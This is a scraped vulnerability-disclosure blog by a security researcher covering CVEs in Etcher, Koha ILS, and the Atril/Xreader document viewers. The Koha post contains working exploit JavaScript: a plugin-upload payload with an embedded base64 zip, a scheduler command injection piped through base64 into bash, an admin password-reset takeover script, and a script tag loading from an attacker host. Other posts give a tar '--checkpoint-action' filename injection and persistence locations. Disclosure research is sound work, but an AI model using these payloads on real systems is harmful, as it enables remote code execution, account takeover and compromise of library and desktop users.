* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* [Comment](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/#respond)
* Reblog
* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2022%2F01%2F19%2Fcritical-csrf-in-filebrowser%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2022%2F01%2F19%2Fcritical-csrf-in-filebrowser%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/pdF9Nn-2)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/)
  + [View post in Reader](https://wordpress.com/read/blogs/201901473/posts/2)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)



=== Content from febin0x4e4a.wordpress.com_9f76f9ca_20250115_193557.html ===



=== Content from febin0x4e4a.wordpress.com_298dc9dd_20250115_193600.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# About

This is an example of a page. Unlike posts, which are displayed on your blog’s front page in the order they’re published, pages are better suited for more timeless content that you want to be easily accessible, like your About or Contact information. Click the Edit link to make changes to this page or [add another page](https://wordpress.com/page/201901473/new/ "Direct link to Add New Page in your Dashboard").

### Leave a comment [Cancel reply](/about/#respond)

Δ

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2Fabout%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2Fabout%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/PdF9Nn-1)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com/about/)
  + [View post in Reader](https://wordpress.com/read/blogs/201901473/posts/1)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)



=== Content from febin0x4e4a.wordpress.com_8d9f3bd3_20250115_193637.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# Author: FebiNJ

# [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)

[22nd August 202422nd August 2024](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/#respond)

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2024/08/etcher.webp?w=1024)

Local Privilege Escalation Vulnerability in Balena Etcher software in Ubuntu/Debian due to a race-condition issue.

Severity: **Medium**

Etcher is a popular cross-platform tool from balena.io to flash OS images onto SD cards and USB drives safely and easily. It is one of the most-popular USB flashing tools.

A Local Privilege Escalation flaw has been discovered in the latest version of Etcher <= v1.18.11 that allows an attacker with a low-privileged user account to create a directory named “etcher”
under /tmp, when the Admin user runs Etcher in his session, the attacker can achieve LPE.

This vulnerability arises due to the fact that, when someone runs Etcher, it creates a temporary directory under /tmp and writes a file under /tmp/etcher and the file will look something like “balena-etcher-electron-[random-uuid].cmd. Etcher then prompts for root/admin password, when admin enters the password, it then calls /tmp/etcher/balena-etcher-electron-[random-uuid].cmd and executes it with root privileges. Etcher then deletes the file and /tmp/etcher will be removed after a system reboot.

An attacker with a low-priv user account can exploit this behavior by creating his own /tmp/etcher directory, when the admin or any other user runs Etcher, it will write balena-etcher-electron-.cmd under attacker-owned /tmp/etcher directory.
The Attacker may not directly overwrite the file /tmp/etcher/balena-etcher-electron-[random-uuid].cmd because the file is created and owned by the admin or the user who ran Etcher, the attacker can just delete the /tmp/etcher directory as he is the owner of the directory and then he can again create /tmp/etcher directory and create a file that has exactly the same name as the file “balena-etcher-electron-[random-uuid].cmd” which is created by Etcher before. Etcher will then run the attacker’s malicious commands instead of the actual commands that are supposed to run.

Etcher creates the file before the password prompt and runs after the user enters the root/admin password, this is where the Race-Condition happens, attacker can create an automated script that creates /tmp/etcher and monitors it constantly, if a file is being created under /tmp/etcher it immediately deletes the directory and creates a fake /tmp/etcher/balena-etcher-electron-[random-uuid].cmd.

Limitation: The only limitation of the exploit is that while running the exploit, if there’s already /tmp/etcher present that means someone already ran Etcher Software before the exploit, a system reboot is required i.e., if there’s already a /tmp/etcher directory is present and that’s not owned by the attacker then the attacker should wait for a reboot.

Demo Scenario:

1. An attacker with a low privileged user (low-priv) access to the target.

2. Admin privileged user running etcher (adminuser) in Ubuntu.

Demo video: <https://github.com/febin0x10/etcher_privesc_exploit/raw/main/Etcher_privilege_escalation_linux_by_Febin.mp4>

Download Exploit: <https://github.com/febin0x10/etcher_privesc_exploit.git>

Software Information:

Etcher is a popular SD card flasher app that is simple for end users, extensible for developers, and works on any platform.

Official Website: <https://etcher.balena.io/>
Github Repo: <https://github.com/balena-io/etcher>
Download Vulnerable version(.deb): <https://github.com/balena-io/etcher/releases/download/v1.18.11/balena-etcher_1.18.11_amd64.deb>

Update Etcher to its latest version!

# [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)

[7th March 202417th April 2024](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/#respond)

```
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2024/03/koha2.png)

PART-1 (Arbitrary Command Injection) [CVE-2024-28739]

An Arbitrary Command injection vulnerability has been discovered in the latest version (23.05) of Koha ILS. The vulnerability is present in the Task Scheduler feature, which allows arbitrary input from the user and appends it to a system command.
An Attacker can Schedule a task and intercept and modify the HTTP request using a proxy tool like BurpSuite and inject arbitrary system commands with backticks (`) inside the "format=" parameter, the arbitrary command will then execute on the system at the scheduled time.

Severity: HIGH

The HTTP request will look something like this:

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

The command Task Scheduler is scheduling a command on the system that will look something like this:

export KOHA_CONF="/etc/koha/sites/library/koha-conf.xml"; /usr/share/koha/bin/cronjobs/runreport.pl 1 --format=text --to=

Steps to Reproduce:

1. Log in to Koha Intranet as Admin Staff
2. Go to Task Scheduler (/cgi-bin/koha/tools/scheduler.pl)
3. Schedule a task, and set the time for the job to execute (current server time+2 minutes)
4. Intercept the HTTP Request and Inject any arbitrary command

mode=job_add&starttime=[TIME here]&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

5. Forward the request.
6. Important thing to note here is that this is a Blind Arbitrary Command Injection i.e., we wouldn't be able to see the command output but it will execute anyways. So use "whoami>/tmp/whoami.txt" as the injection command.

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`whoami+>/tmp/whoami.txt`&email=

7. Wait for some time and you will be able to see a file named whoami.txt being created in/tmp directory on the target server, if you read it will see "library-koha"(koha system username).

PART-2 (XSS to RCE) [CVE-2024-28740]

The above command injection vulnerability can only be exploited if the adversary has the credentials for the Koha Intranet Staff Admin user! Any ways to exploit this without having credentials? The answer is yes! We can trigger this RCE vulnerability just by sending the admin a URL/Link.

This can be achieved by abusing the "Additional contents (HTML customizations)" feature in Koha. This is basically a Cross-Site Scripting (XSS) vulnerability that can be used to bypass CSRF protections in Koha (SameSite=Lax cookie attribute and csrf_token). The HTML customizations feature allows the admin to add HTML content, it also accepts custom javascript.

This is where the problem arises, the attacker can carefully craft a URL with some malicious javascript that adds a task to Task Scheduler to trigger the Command Injection Vulnerability when the admin Staff patron loads the URL in his browser with an authenticated session of Koha, it will add the malicious script to "Additional contents" and the javascript will be executed. In this way, the attacker can gain access to the target system.

In fact, there's an httpOnly flag set for the cookie by Koha and Javascript can't just read the session cookie, this XSS can also be used to steal the CSRF token and forcefully change username and password to completely takeover the Admin Staff account.

If there is Plugin upload feature enabled by the admin, this can be used to drop a malicious plugin to Koha in the background to achieve Remote Code Execution on the target system.

 Proof-Of-Concept:

1. Open Koha Intranet URL
2. Navigate to
[Your Koha domainname]/cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=/&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lang=default

This will execute a simple javascript alert to prove the existence of the vulnerability

I have developed fully working exploits for all the above issues (Authenticated RCE, XSS to RCE, XSS to Account takeover, XSS to plugin upload RCE),

i) I have developed Javascript code that directly uploads malicious plugins to Koha and enables the plugin without any Account takeover.

ii) To reproduce the issue, you may host the JS code yourself and include it in the XSS payload like '<script src="http://your.attacker.machine/xsrf_plugin.js"></script>'

xsrf_plugin.js:

-----------------------------------------------------------------
```
function csrf_to_rce(){

function dataURItoBlob(dataURI) {

  var byteString;

  if (dataURI.split(',')[0].indexOf('base64') >= 0)
    byteString = atob(dataURI.split(',')[1]);
  else
    byteString = unescape(dataURI.split(',')[1]);

  // separate out the mime component
  var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];

  // write the bytes of the string to a typed array
  var ia = new Uint8Array(byteString.length);

  for (var i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }

  return new Blob([ia], {
    type: mimeString
  });
}

var dataUri = "data:application/zip;base64,UEsDBAoAAAAAAHpk91YAAAAAAAAAAAAAAAAFABwAS29oYS9VVAkAA1DRvGSM0bxkdXgLAAEEAAAAAAQAAAAAUEsDBAoAAAAAAJVI+FYAAAAAAAAAAAAAAAAMABwAS29oYS9QbHVnaW4vVVQJAANS8b1kXPG9ZHV4CwABBAAAAAAEAAAAAFBLAwQKAAAAAAD2s/RWAAAAAAAAAAAAAAAAEAAcAEtvaGEvUGx1Z2luL1JjZS9VVAkAA3douWQyMr1kdXgLAAEEAAAAAAQAAAAAUEsDBBQAAAAIAJVI+FbYjsVGowEAAEYDAAASABwAS29oYS9QbHVnaW4vUmNlLnBtVVQJAANR8b1kMjK9ZHV4CwABBAAAAAAEAAAAAJVRXWvcMBB8169YzEEukFx8CX2Iy4XSkkIpbcMV8irW9t5ZjSU5+mh6lPz3rnxyc0nzUmEse3Z2d2ZXDNjc4Zbgs+2wqm76uFWmqtYNvRUieoIvtiXHyA25PkM18uv+YX6Y4qvqPcPHTLHRwez2ev3907evsIKiXCyLCdYUsMWAjP8WwMegJjg4qys44uZHJ2MUY+isex79SLUyOc6lSO5J1Ob4eXm+PC0vTsvLQ1Ic0tXmIsUTqdiTtDJKRy1/kvPKmrHS8nJRvlmUJT9lrqXx10taNC1t9tEJPZA7DSJLId84NYSJlLqETnkYxiECf60/XHOvRx6Y3/lAel48dBa1ujoLejgj0/A+ijRmseoI2wuoacPupSfTSk3e8zK9EPutQGftHYQOA7hoPDi17ULOYJggJ8B9pEip/eBswxi1grPzz1RWjqzF0HPvJgaW4GP9av+8XL2DOcw89ZsTmA3oUHs45tW/k6w/EV6ziFoq6awNyeXjX5uNs+aHraVJFvrdc4dsziizhTQc2DirAccE4IxJbNL6osg/Mv9fnRBLZv8BUEsBAh4DCgAAAAAAemT3VgAAAAAAAAAAAAAAAAUAGAAAAAAAAAAQAO1BAAAAAEtvaGEvVVQFAANQ0bxkdXgLAAEEAAAAAAQAAAAAUEsBAh4DCgAAAAAAlUj4VgAAAAAAAAAAAAAAAAwAGAAAAAAAAAAQAO1BPwAAAEtvaGEvUGx1Z2luL1VUBQADUvG9ZHV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAAPaz9FYAAAAAAAAAAAAAAAAQABgAAAAAAAAAEADtQYUAAABLb2hhL1BsdWdpbi9SY2UvVVQFAAN3aLlkdXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAAAAgAlUj4VtiOxUajAQAARgMAABIAGAAAAAAAAQAAAO2BzwAAAEtvaGEvUGx1Z2luL1JjZS5wbVVUBQADUfG9ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAABAAEAEsBAAC+AgAAAAA=";

var blob = dataURItoBlob(dataUri);

         var formData = new FormData(),
          request  = new XMLHttpRequest();
          request.withCredentials = true;

    /** Configure the request */
    request.open( "POST", "http://library.kali.local:8001/cgi-bin/koha/plugins/plugins-upload.pl", true );

    formData.append( "uploadfile", blob, "feb.kpz" );
    formData.append("op","Upload");
    request.send(formData);
   }

csrf_to_rce();
fetct("/cgi-bin/koha/plugins/plugins-enable.pl?class=Koha::Plugin::Rce&method=enable"); //Plugin Enable

```
----------------------------------------------------------------

This above Javascript code will directly upload plugin without Account takeover.
The plugin will execute whoami command and stores it's output to /tmp/encode

3. I have created working JS code for Command Injection and Account takeover as well

rce.js:

-----------------------------------------------------------
```
fetch("/cgi-bin/koha/tools/scheduler.pl").then(response => response.text()).then((response) => {
window.server_time = response.match(/([0-9]{2}:[0-9]{2})/)[1];

var cmd = "whoami >/tmp/xss_sh";
var b64cmd = encodeURIComponent(btoa(cmd));
var inject = "echo+"+b64cmd+"|base64+-d|bash"
var hour = server_time.split(":")[0];
var min = server_time.split(":")[1];

if (Number(min)+2 > 60){
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = String(Number(hour)+1)

fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
} else {
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = hour
fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
}
 }).catch(err => console.log(err))

```
-----------------------------------------------------------

This above code will fetch server time from the target and schedules a task(server time + 2 minutes) with the arbitrary injected command.

xsrf_ato.js (Account takeover):

-------------------------------------------------------------
```
fetch("/cgi-bin/koha/members/member-password.pl?member=1").then(response => response.text()).then((response) => {window.csrf_token = response.match(/value=\"(.{92})\"/)[1];
const xhr = new XMLHttpRequest();
xhr.open("POST","/cgi-bin/koha/members/member-password.pl",true);
xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
xhr.send("destination=&borrowernumber=1&member=1&newuserid=admin&newpassword=Koha@pwn1234&newpassword2=Koha@pwn1234&csrf_token="+csrf_token);
}).catch(err => console.log(err))

```
-------------------------------------------------------------

This above JS will steal the CSRF token and performs a password reset. It sets admin:Koha@pwn1234 as Admin Staff credentials.

Thanks for reading,
Febin

```

# [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)

[17th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/#respond)

*A Critical One-Click RCE/Command Injection Vulnerability Affecting Popular Linux Operating Systems with MATE, Cinnamon, and some Xfce desktop Environments.*

My 9th and 11th CVEs

**Affected Operating Systems:**

Linux Mint
Kali Linux (Popular OS among Security professionals, and researchers)
Parrot OS (Popular OS among Security professionals, and researchers)
Ubuntu-Mate
Xubuntu
Fedora Cinnamon
Fedora Mate
Manjaro Mate
Manjaro Cinnamon
Ubuntu Kylin (Official Chinese Ubuntu)
Kylin OS V10 ( OS said to be used in the Chinese Government Sectors )

And other MATE, Cinnamon, and some Xfce desktop Environments.

Affected Software Component: All versions including the latest versions of Atril Document Viewer (Default Doc reader for MATE environment, one of the popular doc readers) and Xreader Document Viewer (Default doc reader in Linux Mint)

**Vulnerability Summary:**

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Linux Mint Xreader. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

The specific flaw exists within the parsing of CBT files. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the current user.

This vulnerability is due to a bad code segment in Atril and Xreader responsible for handling comic book documents (.cbr, .cbz, .cbt, .cb7). Comic book documents are just archives that contain images in it. The vulnerability here can be exploited using a maliciously crafted CBT document which is a TAR archive.

Root Cause – Vulnerable Code segment in both doc viewers (comics-document.c):

```

static const ComicBookDecompressCommand command_usage_def[] = {
        /* RARLABS unrar */
    {"%s p -c- -ierr --", "%s vb -c- -- %s", NULL             , FALSE, NO_OFFSET},

        /* GNA! unrar */
    {NULL               , "%s t %s"        , "%s -xf %s %s"   , FALSE, NO_OFFSET},

        /* unzip */
    {"%s -p -C --"      , "%s %s"          , NULL             , TRUE , OFFSET_ZIP},

        /* 7zip */
    {NULL               , "%s l -- %s"     , "%s x -y %s -o%s", FALSE, OFFSET_7Z},

        /* tar */
    {"%s -xOf"          , "%s -tf %s"      , NULL             , FALSE, NO_OFFSET},

    /* UNARCHIVER */
    {"unar -o -"        , "%s %s"          , NULL         , FALSE, NO_OFFSET}
};

```

By looking at the above code, we can see that there are shell commands used for decompression. Look at the /\* tar \*/ section, it actually calls the following shell command, “tar -xOf -tf ![]()“. This is to view/load each image inside the CBT document. This behavior can be exploited by using an option of tar program ‘–checkpoint-action’ to execute arbitrary commands on the target by naming one of the images inside the CBT document to something like ‘–checkpoint-action=EXEC=bash -c “whoami>/tmp/who.txt”;.jpg’.

This vulnerability was already found in Evince Document viewer (the default Doc reader of GNOME) back in 2017. Since Atril and Xreader are forks of Evince, this vulnerability was present in both Atril and Xreader. Atril’s team fixed the vulnerability at that time by adding a piece of code that quits Atril’s process if the CBT file with “–checkpoint-action=” in its name. The following was the patch (comics-document.c) (line – 983):

```

extract_argv (EvDocument *document, gint page)
{
    ComicsDocument *comics_document = COMICS_DOCUMENT (document);
    char **argv;
    char *command_line, *quoted_archive, *quoted_filename;
    GError *err = NULL;

    if (g_strrstr (comics_document->page_names->pdata[page], "--checkpoint-action="))
    {
        g_warning ("File unsupported\n");
        gtk_main_quit ();
    }

```

As you can see, it throws a “File Unsupported” message to the console and quits when it sees “–checkpoint-action=” in a page/filename. I noticed that this only works with an empty file or a really small image file, and if we provide a larger file with more bytes, the “gtk\_main\_quit ();” function fails, so it continues to run, thus executing the injected arbitrary command.

In the MATE desktop environment, many XFCE and lightweight desktop environments (including OS like Kali, Parrot, Xubuntu, Ubuntu Mate, Kylin, Fedora Mate, Manjaro Mate), this vulnerability can be exploited just by sending a link/URL because these Operating Systems/Environments has Atril and Atril has an additional component called atril-previewer that will trigger the exploit without even opening or clicking on the document. An attacker can craft a webpage that instantly downloads the crafted CBT file onto the target system when the target user visits the webpage and the latest Firefox browser nowadays downloads automatically by default without user confirmation, when the user navigates to his Downloads directory the payload will be executed, gives the attacker the shell.

In Linux Mint (Cinnamon Desktop Environment), the target user must open the document to trigger the payload because Linux Mint uses Xreader and Xreader doesn’t have a previewer.

**Exploit**: <https://github.com/febinrev/atril_cbt-inject-exploit.git>

Exploit Dependencies: poppler-utils
Please install poppler-utils before running the exploit script on your Linux machine (Kali preferred). Installation: apt install poppler-utils.

**Github Advisory on MATE Atril**: <https://github.com/mate-desktop/atril/security/advisories/GHSA-34rr-j8v9-v4p2>

**Zero Day Initiative Advisory on Mint Xreader**: <https://www.zerodayinitiative.com/advisories/ZDI-23-1836/>

Thanks for Reading!

# [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)

[17th January 202417th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/#respond)

My 8th and 10th CVEs

**Slippy-book: EPUB File Parsing Directory Traversal Remote Code Execution**

### CVE-2023-44451 (Xreader), CVE-2023-52076(Atril)(Reserved):

RCE Vulnerability affected popular Linux Distros including Mint, Kali, Parrot, Manjaro etc. EPUB File Parsing Directory Traversal Remote Code Execution

A Critical Path traversal and Arbitrary file write vulnerability has been discovered in the default document viewer software of Linux’s MATE/ and Linux Mint affecting popular operating systems such as Kali Linux, Parrot Security OS, Ubuntu-Mate, Linux Mint, Xubuntu, and all the other Operating Systems that use MATE or Atril/Xreader as default doc viewer.

The vulnerability exists in Atril Document Viewer and Xreader Document Viewer which are the default document viewers of the MATE environment and Linux Mint respectively. Atril is the default document reader for Kali Linux, Ubuntu-Mate, Parrot Security OS, and Xubuntu, and Xreader is the default document reader for Linux Mint.

This vulnerability is capable of writing arbitrary files anywhere on the filesystem to which the user opening a crafted document has access, the only limitation is that this vulnerability cannot be exploited to overwrite existing files but that doesn’t stop an attacker from achieving Remote Command Execution on the target system.

I named this vulnerability “*Slippy-Book*“

**Severity**: CRITICAL

**Impact**: Remote Command Execution, System compromise

This can be used particularly against security researchers who mostly use Kali and Parrot OS and also desktop users who use Linux Mint.

Remote Command Execution can be achieved in many ways:

1. The most efficient way to achieve RCE is by placing a malicious .desktop entry under $HOME/.config/autostart/ directory, and the .desktop will execute when the user logs out and logs back in, the autostart/ directory acts as the startup folder in Windows, and it will execute all the .desktop entries that are present inside at startup. We can place an infinite number of .desktop files with random names under autostart/ directory to achieve RCE, no need to overwrite any file.
2. By writing the authorized\_keys file under the .ssh/ directory inside the user’s home, in this way, an attacker can immediately achieve Command Execution via SSH if the target system has SSH enabled.
3. RCE can be achieved in another way just by writing files like .bash\_profile, .bash\_login, .zshrc, .cshrc, .vimrc, .xsession under the user’s home directory. Many of these files might be missing in operating systems, it depends on the OS. In Ubuntu-mate and Linux Mint, .bash\_profile, and .bash\_login files won’t be present, and placing those files with malicious commands written inside under the user’s home directory will result in RCE if the user logs in to the system without GUI mode, like SSH login.
4. Another way to achieve control over the target system is by writing files in places like ~/.local/bin, ~/.local/lib/python3.9/site-packages/, ~/.local/lib/python3.10/site-packages/, ~/.local/lib/python3.11/site-packages/, ~/.local/share/applications/, /var/www/html/, /var/www/ and so on.

**[+] Finding the Vulnerability:**

I was researching archive file formats such as Zip, Tar, Rar, etc., and the software that works with archives, then I got the idea to get into the Ebook file format (.epub) because .epub files are really Zip archives with some XML, HTML and other files packed inside. Even though Epub files are just zip files, epub format has its own standards.

**[\*] How did I find the vulnerability?**

People have been exploiting Archives since the early 2000s, researchers are constantly looking into Archives and archiving software for vulnerabilities and Zero-day acquisition companies like Zerodium are willing to pay million-dollar bounties for zero-days in archives and archivers. So, I thought to give it a try. I am not a binary ninja or kernel exploitation specialist to pull off a highly complicated exploit chain that could give me a code execution or elevation of privilege. My approach was, “What is the dumbest thing that could possibly work”.

Path traversal is one of the most common vulnerabilities that affect Archives and software that deals with archives, Zip Slip is one such vulnerability that leads to arbitrary file overwrite and Code execution that was disclosed on the 5th of June 2018 by the Snyk Security team, Zip Slip was a widespread vulnerability affected many software and libraries that handle Zip archives. Path traversal in zip archives was an ancient bug in the wild even before that was disclosed by the Snyk Security team. It is still present in many software including some Android file managers.
Another such vulnerability was discovered in WinRar with the CVE Id CVE-2018-20250, in which a potential path traversal can be exploited to achieve RCE.

Archives were developed in a period when people not much cared about security, and that’s where all the problems began.

Knowing that Path traversals can be a problem in the archive, I started testing it out on EPUB. I started off by downloading a sample .epub file from the internet and started playing with it. Then I did something really interesting, I added my own files into the .epub file by using the “zip -u” command.

`$ zip -u sample1.epub hello.txt`

And then when I listed the contents of the EPUB archive using “unzip -l”, I was able to see my hello.txt was present inside the EPUB. Perfect! So what’s next? As I said above, my approach was, “What is the dumbest thing that could possibly work” so what I did next was add a bunch of Path Traversal gadgets (../../) at the beginning of my filename hello.txt.

I was using Kali Linux and logged in as root during the research on archives.
Then, I navigated to the directory graphically and clicked on the EPUB document, the document opened up and nothing happened but after that, I noticed something really interesting, the hello.txt file was present under my Kali Linux’s root (/). I tried overwriting existing files but that didn’t work.

